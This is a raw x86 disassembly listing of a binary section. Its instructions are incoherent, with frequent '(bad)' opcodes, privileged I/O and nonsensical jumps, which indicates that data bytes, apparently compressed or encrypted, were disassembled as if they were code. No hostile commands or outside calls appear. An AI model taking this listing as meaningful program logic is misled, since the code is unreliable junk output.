  4b65e7:	sbb    DWORD PTR [eax],edi
  4b65e9:	cwde   
  4b65ea:	xor    BYTE PTR [ecx+edi*2+0x7ae46f23],bl
  4b65f1:	cmp    BYTE PTR [eax+0x14a44c2a],ah
  4b65f7:	pusha  
  4b65f8:	pushf  
  4b65f9:	addr16 in al,0x19
  4b65fc:	mov    al,0x8c
  4b65fe:	mov    esp,0x9bc8cfb4
  4b6603:	cmp    eax,0xc891c41a
  4b6608:	retf   0xd4ec
  4b660b:	or     al,0xae
  4b660d:	mov    esp,0x48b0ca91
  4b6612:	fsubr  st(0),st
  4b6614:	and    ch,BYTE PTR [esp+ebx*4]
  4b6617:	and    al,0xe4
  4b6619:	cmp    ecx,DWORD PTR [edi]
  4b661b:	out    0x46,eax
  4b661d:	in     al,dx
  4b661e:	ret    
  4b661f:	and    dh,BYTE PTR [edx-0x10]
  4b6622:	push   esp
  4b6623:	fwait
  4b6624:	mov    eax,ds:0x6084a0e1
  4b6629:	nop
  4b662a:	fwait
  4b662b:	cld    
  4b662c:	sbb    DWORD PTR [ebp-0x4a],eax
  4b662f:	inc    ebp
  4b6630:	in     al,0x88
  4b6632:	cmp    edi,DWORD PTR [ecx-0x431aa654]
  4b6638:	int3   
  4b6639:	sub    bl,BYTE PTR [edi+0x1801183e]
  4b663f:	sbb    DWORD PTR [eax],esp
  4b6641:	js     0x4b6647
  4b6643:	out    dx,eax
  4b6644:	mov    al,ds:0x9694f44c
  4b6649:	daa    
  4b664a:	sbb    bh,BYTE PTR ds:[ecx+ebx*1]
  4b664e:	mov    ecx,0xdd357efc
  4b6653:	add    al,BYTE PTR [eax-0x69]
  4b6656:	fadd   QWORD PTR [edx]
  4b6658:	je     0x4b65da
  4b665a:	xchg   ecx,eax
  4b665b:	cmp    eax,0x97e4d23e
  4b6660:	fadd   DWORD PTR [edx]
  4b6662:	mov    DWORD PTR [eax+eax*1+0x76eb7a0e],ecx
  4b6669:	sub    esi,DWORD PTR [ecx+0x4]
  4b666c:	dec    esp
  4b666d:	xlat   BYTE PTR ds:[ebx]
  4b666e:	push   ss
  4b666f:	cs and al,0x22
  4b6672:	and    esp,DWORD PTR [ebx]
  4b6674:	out    dx,eax
  4b6675:	adc    BYTE PTR [eax+ecx*2],cl
  4b6678:	ins    BYTE PTR es:[edi],dx
  4b6679:	js     0x4b662e
  4b667b:	push   ds
  4b667c:	add    DWORD PTR [edi-0x2d9b59e2],0x3c
  4b6683:	lods   al,BYTE PTR ds:[esi]
  4b6684:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4b6685:	push   cs
  4b6686:	mov    esp,?
  4b6688:	pop    esp
  4b6689:	push   ss
  4b668a:	cld    
  4b668b:	addr16 (bad) 
  4b668d:	pusha  
  4b668e:	stc    
  4b668f:	ins    BYTE PTR es:[edi],dx
  4b6690:	mov    al,0x77
  4b6692:	nop
  4b6693:	adc    eax,0x9e467914
  4b6698:	xchg   ecx,eax
  4b6699:	mov    eax,0xf42cdc20
  4b669e:	xchg   ecx,eax
  4b669f:	out    0xf2,eax
  4b66a1:	sbb    DWORD PTR [esp+ecx*1],esi
  4b66a4:	mov    cl,0x38
  4b66a6:	sbb    al,0x19
  4b66a8:	jns    0x4b66d4
  4b66aa:	mov    edi,0x87162a3c
  4b66af:	dec    edx
  4b66b0:	inc    esp
  4b66b1:	cmp    BYTE PTR [eax+0xe],cl
  4b66b4:	into   
  4b66b5:	push   ebx
  4b66b6:	stc    
  4b66b7:	jmp    0x549bb030
  4b66bc:	adc    BYTE PTR [edx+esi*8+0x46],dl
  4b66c0:	sahf   
  4b66c1:	ja     0x4b6711
  4b66c3:	pop    eax
  4b66c4:	jo     0x4b6722
  4b66c6:	cmp    BYTE PTR [esi+ebx*4-0x6f],bh
  4b66ca:	aaa    
  4b66cb:	xor    ah,BYTE PTR [eax+0x64]
  4b66ce:	retf   0x6898
  4b66d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4b66d2:	enter  0x791b,0x46
  4b66d6:	ins    BYTE PTR es:[edi],dx
  4b66d7:	mov    al,0x74
  4b66d9:	sub    al,ah
  4b66db:	mov    ecx,0x80de467c
  4b66e0:	adc    al,0xec
  4b66e2:	mov    WORD PTR [eax],ss
  4b66e4:	mov    dl,0x94
  4b66e6:	and    edx,DWORD PTR [edi-0x67cb1b91]
  4b66ec:	mov    esp,0xa09cb244
  4b66f1:	inc    ebx
  4b66f2:	in     eax,0x19
  4b66f4:	jns    0x4b672e
  4b66f6:	push   0xaf8474a4
  4b66fb:	dec    esi
  4b66fc:	mov    eax,0xbb9c4c0
  4b6701:	rcl    BYTE PTR [bp+di-0x7a28],0x53
  4b6707:	and    al,0x54
  4b6709:	mov    bh,0xea
  4b670b:	mov    dl,0x13
  4b670d:	scas   al,BYTE PTR es:[edi]
  4b670e:	push   edx
  4b670f:	pusha  
  4b6710:	sub    ch,BYTE PTR [eax]
  4b6712:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4b6713:	sub    DWORD PTR [eax],edx
  4b6715:	add    al,0x5e
  4b6717:	and    BYTE PTR [edx+0x15],al
  4b671a:	add    al,0x46
  4b671c:	xchg   BYTE PTR [esi-0x1389bfc2],dh
  4b6722:	dec    ebx
  4b6723:	(bad)  
  4b6724:	push   ecx
  4b6725:	inc    bl
  4b6727:	and    eax,0xae8c3854
  4b672c:	ret    0xb1ce
  4b672f:	shr    BYTE PTR [ebx+0x4b],0xb7
  4b6733:	pop    esp
  4b6734:	sub    BYTE PTR [edx-0x6311e1dc],bh
  4b673a:	mov    edx,0x6d4c0741
  4b673f:	xor    al,0xe
  4b6741:	mov    ebp,0xffd2ca87
  4b6746:	sar    esi,1
  4b6748:	lea    edx,[esi+esi*2]
  4b674b:	mov    eax,DWORD PTR [esp+edx*4+0x38]
  4b674f:	push   eax
  4b6750:	aad    0x3b
  4b6752:	ret    
  4b6753:	test   ebp,esi
  4b6755:	por    mm7,QWORD PTR [ebp+0x7]
  4b6759:	dec    esi
  4b675a:	pop    edx
  4b675b:	jmp    0x4b6764
  4b675d:	jle    0x4b6774
  4b675f:	les    eax,FWORD PTR [edi]
  4b6761:	fwait
  4b6762:	shl    BYTE PTR [esi+ebx*2+0x7e8c3954],1
  4b6769:	ret    0x6705
  4b676c:	mov    bh,0xcd
  4b676e:	mov    bl,0xb2
  4b6770:	pop    esi
  4b6771:	push   ds
  4b6772:	inc    esp
  4b6773:	jg     0x4b6765
  4b6775:	mov    dh,BYTE PTR [esi+0x3]
  4b6778:	test   BYTE PTR [edx],0xc8
  4b677b:	sbb    ah,BYTE PTR [eax]
  4b677d:	mov    eax,ds:0x7a340a5a
  4b6782:	add    ebp,DWORD PTR [edx+0x48]
  4b6785:	mov    bh,0xb0
  4b6787:	mov    edx,0x1b19b01c
  4b678c:	sub    al,ch
  4b678e:	fs jne 0x4b67c7
  4b6791:	jge    0x4b67c7
  4b6793:	jbe    0x4b67a8
  4b6795:	adc    BYTE PTR [esi-0x1ffeeabf],al
  4b679b:	pop    ebx
  4b679c:	mov    ds:0x5ef26be5,al
  4b67a1:	cmp    dl,ah
  4b67a3:	jmp    DWORD PTR [edx+0x38]
  4b67a6:	xor    BYTE PTR [edi],cl
  4b67a8:	adc    BYTE PTR [ecx],dh
  4b67aa:	xchg   BYTE PTR [edx+ebx*1+0x44],bh
  4b67ae:	xor    al,0x2e
  4b67b0:	add    al,al
  4b67b2:	jne    0x4b6822
  4b67b4:	retf   
  4b67b5:	shr    DWORD PTR [ecx+ecx*4],1
  4b67b8:	push   ebx
  4b67b9:	sbb    dh,BYTE PTR [eax-0x68bc4185]
  4b67bf:	push   0xca2117dd
  4b67c4:	fstp   QWORD PTR [eax]
  4b67c6:	xlat   BYTE PTR ds:[ebx]
  4b67c7:	xchg   edx,eax
  4b67c8:	mov    ch,0x23
  4b67ca:	nop
  4b67cb:	test   al,0x74
  4b67cd:	and    eax,0x36506968
  4b67d2:	mov    dh,BYTE PTR [ebx+ebp*4+0x5b7c6921]
  4b67d9:	jae    0x4b67dd
  4b67db:	or     edx,esp
  4b67dd:	jo     0x4b6781
  4b67df:	pop    esi
  4b67e0:	daa    
  4b67e1:	fild   WORD PTR [ecx+eax*4+0x233694d6]
  4b67e8:	sbb    eax,0xa4a9516c
  4b67ed:	xchg   ebp,eax
  4b67ee:	xor    DWORD PTR [eax],edi
  4b67f0:	jmp    0x4b684c
  4b67f2:	ds jp  0x4b680e
  4b67f5:	mov    edi,0x8341ea26
  4b67fa:	call   0xe84e6a22
  4b67ff:	pop    es
  4b6800:	mov    edi,DWORD PTR [edx-0x79]
  4b6803:	ret    
  4b6804:	add    al,0x98
  4b6806:	push   0x88e55c43
  4b680b:	(bad)  
  4b680c:	fimul  DWORD PTR fs:[eax+ebp*2]
  4b6810:	pop    esp
  4b6811:	adc    al,0xac
  4b6813:	or     al,0x5
  4b6815:	and    DWORD PTR [esi-0x46],esp
  4b6818:	aad    0x9e
  4b681a:	mov    cl,0x32
  4b681c:	push   cs
  4b681d:	sub    DWORD PTR [eax-0x6f],0x5b
  4b6821:	jo     0x4b688b
  4b6823:	mov    dh,0x26
  4b6825:	push   cs
  4b6826:	xor    BYTE PTR [edx],al
  4b6828:	xchg   BYTE PTR [ebx+0x76],dl
  4b682b:	cmp    BYTE PTR [ebx+0x11],ch
  4b682e:	lea    esp,[ebp+0x72b2742a]
  4b6834:	retf   0x2a09
  4b6837:	xchg   esi,eax
  4b6838:	cmp    ah,BYTE PTR [edx+edx*4-0x39]
  4b683c:	xchg   ebx,eax
  4b683d:	jl     0x4b6811
  4b683f:	je     0x4b67f4
  4b6841:	(bad)  
  4b6842:	cmp    eax,0xb7441513
  4b6847:	add    al,0xb
  4b6849:	in     al,dx
  4b684a:	xor    ah,bl
  4b684c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4b684d:	dec    esp
  4b684e:	jecxz  0x4b6849
  4b6850:	xchg   BYTE PTR [edi+0x16ae345a],ah
  4b6856:	adc    edx,DWORD PTR [ecx+0x4e]
  4b6859:	xchg   ebp,eax
  4b685a:	mov    dl,0xb0
  4b685c:	jge    0x4b6862
  4b685e:	and    esp,esp
  4b6860:	loopne 0x4b6865
  4b6862:	mov    bh,BYTE PTR [ebp-0x7b0c9393]
  4b6868:	in     eax,0xcb
  4b686a:	fidivr DWORD PTR [esi-0x5dc4bb9a]
  4b6870:	jl     0x4b6879
  4b6872:	and    ecx,edx
  4b6874:	out    dx,al
  4b6875:	or     ah,bl
  4b6877:	imul   esp,DWORD PTR [ecx+0x20658abc],0xffffff95
  4b687e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4b687f:	ror    DWORD PTR [ebp+esi*1+0xc],0x13
  4b6884:	push   esp
  4b6885:	enter  0x28c2,0xcc
  4b6889:	inc    esp
  4b688a:	sar    DWORD PTR [eax+0x7d847b07],0xb7
  4b6891:	push   edx
  4b6892:	push   esi
  4b6893:	xor    eax,0xa891caff
  4b6898:	mov    WORD PTR [edx+0x56d44fd3],?
  4b689e:	or     eax,0x2e638227
  4b68a3:	add    ecx,DWORD PTR [ecx+0x1c]
  4b68a6:	repnz loopne 0x4b68b3
  4b68a9:	arpl   WORD PTR ds:0x547f246e,cx
  4b68af:	and    DWORD PTR [eax+0xd52d21c],eax
  4b68b5:	adc    al,0xa3
  4b68b7:	inc    ecx
  4b68b8:	mov    cl,0xa5
  4b68ba:	mov    BYTE PTR [edi+0x3860195f],ah
  4b68c0:	jb     0x4b68d8
  4b68c2:	mov    ds:0x64157902,eax
  4b68c7:	or     eax,0x88810d49
  4b68cc:	lods   eax,DWORD PTR ds:[esi]
  4b68cd:	pop    ds
  4b68ce:	sar    BYTE PTR [ecx+eax*2],cl
  4b68d1:	popf   
  4b68d2:	sbb    eax,0x7082743b
  4b68d7:	enter  0x7538,0xbd
  4b68db:	or     al,0x53
  4b68dd:	sbb    eax,0x58024ff2
  4b68e2:	js     0x4b688b
  4b68e4:	adc    esp,esi
  4b68e6:	xchg   esp,eax
  4b68e7:	mov    dl,0x86
  4b68e9:	stos   BYTE PTR es:[edi],al
  4b68ea:	and    DWORD PTR [ebx],0x8f24ba83
  4b68f0:	sub    esi,DWORD PTR [eax-0x5c4cd595]
  4b68f6:	push   esp
  4b68f7:	adc    al,0x6
  4b68f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4b68fa:	mov    ds:0x3823b4c3,eax
  4b68ff:	std    
  4b6900:	add    DWORD PTR [ebx+0x59],ecx
  4b6903:	mov    ds:0xe4a31318,eax
  4b6908:	sub    al,0x61
  4b690a:	scas   eax,DWORD PTR es:[edi]
  4b690b:	cdq    
  4b690c:	mov    ebp,cr6
  4b690f:	sub    eax,0x583427b1
  4b6914:	sub    eax,0x18221723
  4b6919:	push   edx
  4b691a:	lahf   
  4b691b:	sti    
  4b691c:	mov    ds:0x482a5c05,eax
  4b6921:	push   edi
  4b6922:	dec    eax
  4b6923:	je     0x4b6990
  4b6925:	adc    al,BYTE PTR [ebx+0x3f]
  4b6928:	sbb    esp,DWORD PTR [edi-0x7b]
  4b692b:	mov    BYTE PTR [eax+0x2002d49f],0x47
  4b6932:	cmp    ch,BYTE PTR [edi+edx*2+0x1701e65]
  4b6939:	sbb    ecx,DWORD PTR [ebx+0x90d0c54]
  4b693f:	ins    BYTE PTR es:[edi],dx
  4b6940:	arpl   bp,si
  4b6942:	pop    eax
  4b6943:	(bad)  
  4b6944:	mov    BYTE PTR [edi],dh
  4b6946:	dec    eax
  4b6947:	xchg   esp,eax
  4b6948:	jo     0x4b6969
  4b694a:	call   0x2aa72057
  4b694f:	mov    bh,0xab
  4b6951:	xor    al,BYTE PTR [ecx-0x39e0da04]
  4b6957:	sbb    eax,0xc4a8728
  4b695c:	push   esp
  4b695d:	xor    BYTE PTR [edx],al
  4b695f:	dec    esp
  4b6960:	jno    0x4b6935
  4b6962:	cmp    ch,dh
  4b6964:	add    BYTE PTR [edi-0x7e],ch
  4b6967:	or     eax,0x68ae384
  4b696c:	data16 add dh,ch
  4b696f:	mov    ebx,0x5c65d44
  4b6974:	pop    ss
  4b6975:	pmulhw mm3,QWORD PTR [eax+edi*4+0x44]
  4b697a:	pop    ecx
  4b697b:	iret   
  4b697c:	add    ecx,ebp
  4b697e:	mov    dl,0x6f
  4b6980:	xor    DWORD PTR [ecx+edx*1],esi
  4b6983:	mov    BYTE PTR [edi+0x0],0x29
  4b6987:	int3   
  4b6988:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4b6989:	mov    ecx,0x84af23ed
  4b698e:	rcr    DWORD PTR [esi+0x3e250d09],0x15
  4b6995:	and    edx,DWORD PTR [edi+0x42a690b]
  4b699b:	sbb    cl,BYTE PTR [eax]
  4b699d:	outs   dx,DWORD PTR ds:[esi]
  4b699e:	pop    edx
  4b699f:	ror    dl,0x20
  4b69a2:	pop    ss
  4b69a3:	jmp    0x4b6a05
  4b69a5:	cmp    BYTE PTR [ecx+0x21f3c004],dh
  4b69ab:	xchg   esp,eax
  4b69ac:	ret    
  4b69ad:	adc    BYTE PTR [esp+esi*8+0x2a],0xa5
  4b69b2:	jbe    0x4b69f1
  4b69b4:	loope  0x4b6937
  4b69b6:	or     al,0x90
  4b69b8:	jge    0x4b69de
  4b69ba:	mov    ebx,0xfe36e18c
  4b69bf:	add    BYTE PTR [edx-0x15],bh
  4b69c2:	or     ah,BYTE PTR [ebp-0x65480]
  4b69c8:	outs   dx,BYTE PTR ds:[esi]
  4b69c9:	dec    ecx
  4b69ca:	jp     0x4b69fd
  4b69cc:	aam    0x83
  4b69ce:	or     al,0x30
  4b69d0:	xor    BYTE PTR [ebp+0x3270034b],cl
  4b69d6:	hlt    
  4b69d7:	rcr    DWORD PTR [esi+0x2e141eb8],0xee
  4b69de:	sahf   
  4b69df:	dec    esi
  4b69e0:	scas   al,BYTE PTR es:[edi]
  4b69e1:	dec    ecx
  4b69e2:	rcr    BYTE PTR fs:[ecx],1
  4b69e5:	sti    
  4b69e6:	jmp    0x4b69f8
  4b69e8:	div    DWORD PTR [edi-0x2d43b07b]
  4b69ee:	in     eax,dx
  4b69ef:	or     esp,DWORD PTR [ebx]
  4b69f1:	mov    WORD PTR ds:0xdafdf308,cs
  4b69f7:	push   edi
  4b69f8:	add    BYTE PTR [ebx],0xc2
  4b69fb:	bound  edi,QWORD PTR [esi+eiz*2+0xe61ae06]
  4b6a02:	adc    al,0x9a
  4b6a04:	dec    edi
  4b6a05:	mov    bl,0x7d
  4b6a07:	call   FWORD PTR [edi+0x6]
  4b6a0a:	pop    ebx
  4b6a0b:	pusha  
  4b6a0c:	test   BYTE PTR [eax-0x64ec4b9c],0x88
  4b6a13:	jge    0x4b6a15
  4b6a15:	or     BYTE PTR [ecx],al
  4b6a17:	add    DWORD PTR ds:0x14a0c202,ebx
  4b6a1d:	add    BYTE PTR [ebx],0x71
  4b6a20:	iret   
  4b6a21:	add    al,0x56
  4b6a23:	sbb    DWORD PTR [ebx],ecx
  4b6a25:	and    DWORD PTR [ecx+eiz*8+0x55],ecx
  4b6a29:	sbb    DWORD PTR [ebx-0x7cf30675],esp
  4b6a2f:	leave  
  4b6a30:	inc    eax
  4b6a31:	outs   dx,DWORD PTR ds:[esi]
  4b6a32:	sbb    al,0x74
  4b6a34:	inc    esi
  4b6a35:	ret    0xe078
  4b6a38:	or     eax,0x562426fc
  4b6a3d:	sbb    DWORD PTR ds:0xc1c9c859,ebx
  4b6a43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4b6a44:	(bad)  
  4b6a45:	fcomp  QWORD PTR [eax]
  4b6a47:	xor    eax,0x90316305
  4b6a4c:	test   eax,0x792970a4
  4b6a51:	sbb    al,0x96
  4b6a53:	mov    al,0xa8
  4b6a55:	adc    DWORD PTR [ecx-0x1b],eax
  4b6a58:	gs mov eax,0x978e2a71
  4b6a5e:	xchg   esp,eax
  4b6a5f:	add    eax,0x11fd0b89
  4b6a64:	xchg   ecx,eax
  4b6a65:	cwde   
  4b6a66:	push   ds
  4b6a67:	(bad)  
  4b6a68:	and    ebp,edi
  4b6a6a:	adc    bl,ch
  4b6a6c:	pop    ebx
  4b6a6d:	cli    
  4b6a6e:	cmp    eax,0x6d651e02
  4b6a73:	nop
  4b6a74:	lea    ebx,[edi-0x3ee396bd]
  4b6a7a:	adc    edx,ebp
  4b6a7c:	fistp  DWORD PTR [edi+eiz*4+0x2d]
  4b6a80:	jl     0x4b6a85
  4b6a82:	jno    0x4b6a5d
  4b6a84:	out    dx,al
  4b6a85:	jbe    0x4b6a99
  4b6a87:	adc    BYTE PTR [ebx-0x7b0887ba],0x17
  4b6a8e:	aaa    
  4b6a8f:	stos   DWORD PTR es:[edi],eax
  4b6a90:	push   0xffffff8b
  4b6a92:	xor    BYTE PTR [ebx],0x34
  4b6a95:	mov    al,ds:0x1c8dddcc
  4b6a9a:	scas   eax,DWORD PTR es:[edi]
  4b6a9b:	adc    eax,0xaf0ca1ad
  4b6aa0:	das    
  4b6aa1:	mov    al,0x8d
  4b6aa3:	sbb    bl,ch
  4b6aa5:	ret    0x133
  4b6aa8:	sub    BYTE PTR [eiz*4+0x720bf276],dh
  4b6aaf:	or     ebp,DWORD PTR [edx-0x7fe40f60]
  4b6ab5:	jnp    0x4b6ad7
  4b6ab7:	or     DWORD PTR [esi+0x3c],ebp
  4b6aba:	imul   eax,DWORD PTR [esi],0xbddd4383
  4b6ac0:	inc    eax
  4b6ac1:	mov    eax,ds:0xc3dcb060
  4b6ac6:	push   es
  4b6ac7:	ds int 0x13
  4b6aca:	mov    DWORD PTR [edi+edx*4],eax
  4b6acd:	std    
  4b6ace:	sbb    al,0x30
  4b6ad0:	jmp    0x8ddf:0x366
  4b6ad6:	mov    bh,0x10
  4b6ad8:	fbstp  TBYTE PTR [edx]
  4b6ada:	aam    0x3d
  4b6adc:	test   DWORD PTR [edi-0x4fb789aa],esp
  4b6ae2:	adc    eax,0xa19636a4
  4b6ae7:	leave  
  4b6ae8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4b6ae9:	add    BYTE PTR [edx+0x7],al
  4b6aec:	mov    DWORD PTR [edi],ebx
  4b6aee:	xchg   edi,eax
  4b6aef:	xor    dh,BYTE PTR [esi+0x4a]
  4b6af2:	sbb    ecx,edi
  4b6af4:	mov    edx,0xf20f596e
  4b6af9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4b6afa:	mov    ds:0x94d38c14,eax
  4b6aff:	or     dl,al
  4b6b01:	dec    ecx
  4b6b02:	imul   ecx,DWORD PTR [eax+0x25],0x29
  4b6b06:	adc    al,0x1
  4b6b08:	add    eax,0x72059e92
  4b6b0d:	outs   dx,DWORD PTR ds:[esi]
  4b6b0e:	xchg   edi,eax
  4b6b0f:	push   ebx
  4b6b10:	aam    0xb7
  4b6b12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4b6b13:	ret    0xad06
  4b6b16:	xchg   eax,esp
  4b6b18:	lea    ecx,[edi]
  4b6b1a:	xchg   eax,ecx
  4b6b1c:	cmp    BYTE PTR [esi],bl
  4b6b1e:	pusha  
  4b6b1f:	add    DWORD PTR [ecx],edi
  4b6b21:	ret    
  4b6b22:	and    eax,0x1040a937
  4b6b27:	inc    edx
  4b6b28:	ror    BYTE PTR [edx+0x77],1
  4b6b2b:	push   ds
  4b6b2c:	jb     0x4b6afb
  4b6b2e:	jp     0x4b6b3d
  4b6b30:	or     BYTE PTR [eax+0x77],bh
  4b6b33:	pop    ss
  4b6b34:	mov    DWORD PTR [edx],ecx
  4b6b36:	sub    DWORD PTR [ebx+ebx*8+0x5b],ebp
  4b6b3a:	mov    bl,0x6d
  4b6b3c:	dec    edi
  4b6b3d:	pop    ds
  4b6b3e:	mov    WORD PTR ds:0x2d02335d,fs
  4b6b44:	or     al,0x41
  4b6b46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4b6b47:	mov    dh,0x20
  4b6b49:	das    
  4b6b4a:	rcr    DWORD PTR [edx],cl
  4b6b4c:	(bad)  
  4b6b4d:	jmp    0x4b6bca
  4b6b4f:	or     eax,0xa0a34a6a
  4b6b54:	outs   dx,BYTE PTR ds:[esi]
  4b6b55:	dec    eax
  4b6b56:	mov    eax,0x4a142d1d
  4b6b5b:	mov    eax,0x5d51bc99
  4b6b60:	and    al,0xb4
  4b6b62:	xor    edx,ebx
  4b6b64:	mov    ah,0x7c
  4b6b66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4b6b67:	test   BYTE PTR [esi+0x4c8da69],ah
  4b6b6d:	mov    esp,0x78dce4ec
  4b6b72:	lods   eax,DWORD PTR ds:[esi]
  4b6b73:	imul   esi,DWORD PTR [edx+0xbd15853],0x38
  4b6b7a:	sub    DWORD PTR [ebp-0x65ab2cad],0x79a68a8
  4b6b84:	and    BYTE PTR [esi-0x3b37e385],dl
  4b6b8a:	xor    al,0xb7
  4b6b8c:	outs   dx,DWORD PTR ds:[esi]
  4b6b8d:	xchg   ebx,eax
  4b6b8e:	js     0x4b6ba0
  4b6b90:	pop    ds
  4b6b91:	aam    0xd0
  4b6b93:	dec    ecx
  4b6b94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4b6b95:	cmp    DWORD PTR [ecx+0x30d8dc20],ebp
  4b6b9b:	neg    BYTE PTR [esi+0x0]
  4b6b9e:	aam    0xe4
  4b6ba0:	jle    0x4b6c19
  4b6ba2:	inc    eax
  4b6ba3:	or     dh,0x23
  4b6ba6:	dec    edi
  4b6ba7:	add    al,0xb4
  4b6ba9:	out    0xec,al
  4b6bab:	call   0x8d6abbee
  4b6bb0:	inc    edi
  4b6bb1:	push   eax
  4b6bb2:	xor    eax,0x50851d24
  4b6bb7:	loopne 0x4b6c26
  4b6bb9:	pop    ss
  4b6bba:	or     dl,BYTE PTR [edi]
  4b6bbc:	sub    eax,0x79b56054
  4b6bc1:	data16 mov ch,0x2a
  4b6bc4:	add    DWORD PTR [eax+0x5e],ebp
  4b6bc7:	int3   
  4b6bc8:	mov    dh,0x78
  4b6bca:	or     al,0xc0
  4b6bcc:	daa    
  4b6bcd:	add    BYTE PTR [ecx-0xb8bf55f],al
  4b6bd3:	inc    edx
  4b6bd4:	fdivr  DWORD PTR [esp+eax*8+0x7047610d]
  4b6bdb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4b6bdc:	and    al,BYTE PTR [edx]
  4b6bde:	sub    edx,DWORD PTR [esi+ecx*8]
  4b6be1:	xchg   ecx,eax
  4b6be2:	add    edi,esi
  4b6be4:	dec    ecx
  4b6be5:	inc    ebp
  4b6be6:	ds pop eax
  4b6be8:	out    0x84,al
  4b6bea:	add    BYTE PTR [esp+edx*4],bl
  4b6bed:	ds (bad) 
  4b6bef:	or     eax,0xae399c80
  4b6bf4:	mov    fs,WORD PTR [edx]
  4b6bf6:	neg    al
  4b6bf8:	fiadd  WORD PTR [eax-0x22a8eeaf]
  4b6bfe:	(bad)  
  4b6bff:	mov    WORD PTR [ecx+eax*2+0x56014306],?
  4b6c06:	sub    BYTE PTR [eax-0x64],0x86
  4b6c0a:	scas   eax,DWORD PTR es:[edi]
  4b6c0b:	add    al,0x16
  4b6c0d:	or     cl,BYTE PTR [edx-0xf82ca3d]
  4b6c13:	cmp    eax,DWORD PTR [ecx-0x3e]
  4b6c16:	xor    DWORD PTR [esi-0x749c3dd6],esi
  4b6c1c:	cmp    eax,0x5a021c8b
  4b6c21:	mov    ecx,0x287bd863
  4b6c26:	add    ebp,DWORD PTR [edi+0x5f11c268]
  4b6c2c:	cbw    
  4b6c2e:	js     0x4b6c94
  4b6c30:	add    ebp,ebx
  4b6c32:	jbe    0x4b6c83
  4b6c34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4b6c35:	add    al,BYTE PTR [edx]
  4b6c37:	ins    DWORD PTR es:[edi],dx
  4b6c38:	(bad)  
  4b6c3a:	add    dl,BYTE PTR [ecx-0xfdd0afc]
  4b6c40:	dec    edx
  4b6c41:	or     eax,0x8865870
  4b6c46:	jae    0x4b6bf5
  4b6c48:	fs out 0xde,eax
  4b6c4b:	xor    BYTE PTR [edi-0x13],al
  4b6c4e:	call   0x5bf5:0x32337b82
  4b6c55:	mov    ds,WORD PTR [ebp+0x61]
  4b6c58:	rcl    BYTE PTR [edx+0x49],1
  4b6c5b:	push   ss
  4b6c5c:	sbb    DWORD PTR ss:[ebp-0x1280669f],0xffffffbd
  4b6c64:	xor    al,0x85
  4b6c66:	add    DWORD PTR [ecx-0x64a9ae75],0xffffffc6
  4b6c6d:	scas   eax,DWORD PTR es:[edi]
  4b6c6e:	mov    eax,ds:0x590a5906
  4b6c73:	or     ebp,ebx
  4b6c75:	jmp    0x4b6c4a
  4b6c77:	pop    ds
  4b6c78:	ins    DWORD PTR es:[edi],dx
  4b6c79:	cmp    BYTE PTR [esi+0x142e0fd0],0x2a
  4b6c80:	sub    al,0xe9
  4b6c82:	inc    ebx
  4b6c83:	inc    ecx
  4b6c84:	out    dx,eax
  4b6c85:	add    ecx,DWORD PTR [ecx]
  4b6c87:	icebp  
  4b6c88:	push   esi
  4b6c89:	pop    edx
  4b6c8a:	pop    ecx
  4b6c8b:	sub    BYTE PTR [edx+eax*2+0x6a],bh
  4b6c8f:	inc    esi
  4b6c90:	add    BYTE PTR [esi+0x42],ch
  4b6c93:	adc    BYTE PTR [ecx],bh
  4b6c95:	inc    esi
  4b6c96:	pushf  
  4b6c97:	test   eax,0x5e145b6f
  4b6c9c:	jae    0x4b6c23
  4b6c9e:	dec    ebx
  4b6c9f:	gs out 0xe1,eax
  4b6ca2:	xchg   esi,eax
  4b6ca3:	sbb    ecx,ecx
  4b6ca5:	xor    al,0x8d
  4b6ca7:	pop    edx
  4b6ca8:	xor    ebx,edi
  4b6caa:	pop    esi
  4b6cab:	cld    
  4b6cac:	clc    
  4b6cad:	fwait
  4b6cae:	ret    0xd200
  4b6cb1:	or     BYTE PTR [eax+edx*8+0x52],ch
  4b6cb5:	mov    al,fs:0x88e3021d
  4b6cbb:	add    DWORD PTR [ebp+0x5e526d01],esp
  4b6cc1:	or     DWORD PTR [ecx-0xb2e5c95],0xffffffa0
  4b6cc8:	xchg   esp,eax
  4b6cc9:	push   es
  4b6cca:	lea    esp,[eax]
  4b6ccc:	and    DWORD PTR ds:0xa6f1a42,ebp
  4b6cd2:	cli    
  4b6cd3:	add    al,0x7e
  4b6cd5:	mov    esi,0xaa24142b
  4b6cda:	add    DWORD PTR [ecx],esp
  4b6cdc:	lods   eax,DWORD PTR ds:[esi]
  4b6cdd:	ins    BYTE PTR es:[edi],dx
  4b6cde:	sbb    DWORD PTR [ebx+0x60],esi
  4b6ce1:	aaa    
  4b6ce2:	lods   eax,DWORD PTR ds:[esi]
  4b6ce3:	daa    
  4b6ce4:	test   DWORD PTR [edi],esp
  4b6ce6:	loope  0x4b6d14
  4b6ce8:	dec    DWORD PTR [edx]
  4b6cea:	xor    DWORD PTR [esp+ebx*4],edx
  4b6ced:	adc    ch,0xf4
  4b6cf0:	push   ecx
  4b6cf1:	int    0x32
  4b6cf3:	inc    ecx
  4b6cf4:	mov    al,0xaa
  4b6cf6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4b6cf7:	or     eax,0xa9c906cd
  4b6cfc:	and    bl,cl
  4b6cfe:	cmc    
  4b6cff:	adc    esi,DWORD PTR [ecx+0x1]
  4b6d02:	loope  0x4b6d06
  4b6d04:	scas   eax,DWORD PTR es:[edi]
  4b6d05:	test   eax,0x2aece020
  4b6d0a:	xlat   BYTE PTR ds:[ebx]
